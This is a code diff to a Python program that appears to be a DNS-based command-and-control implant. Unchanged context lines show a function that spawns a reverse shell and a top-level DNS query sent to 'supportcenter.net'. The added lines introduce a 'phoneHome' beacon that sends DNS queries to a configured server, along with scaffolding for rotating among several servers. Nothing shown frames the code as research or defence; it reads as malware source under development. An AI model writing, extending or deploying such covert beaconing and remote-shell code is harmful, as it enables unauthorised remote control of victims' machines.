@@ -9,6 +9,7 @@ import threading
 import base64
 from typing import Union, Sequence
 import platform
+import errno
 
 WAIT_TIME = 10
 
@@ -164,6 +165,34 @@ def resolveFileName(ips):
 def spawnRevShell(host, port):
     thread = threading.Thread(target=startReverseShell, args=(host, port))
     thread.start()
+
+def phoneHome(domain, recordType=None):
+    if IS_LIST:
+        server = SERVER[CURR_SERVER_INDEX]
+    else:
+        server = SERVER
+
+    sock = formSocket()
+    if recordType:
+        sock.sendto(makeQuery(domain, recordType), (server, 53))
+    else:
+        sock.sendto(makeQuery(domain), (server, 53))
+    try:
+        resp, _ = sock.recvfrom(512)
+        return getResponse(resp)
+    except socket.timeout:
+        return []
+
+def rotateServer():
+    pass
+
+global IS_LIST
+
+if isinstance(SERVER, list):
+    IS_LIST = True
+    global CURR_SERVER_INDEX; CURR_SERVER_INDEX = 0
+else:
+    IS_LIST = False
 
 sock = formSocket()
 sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
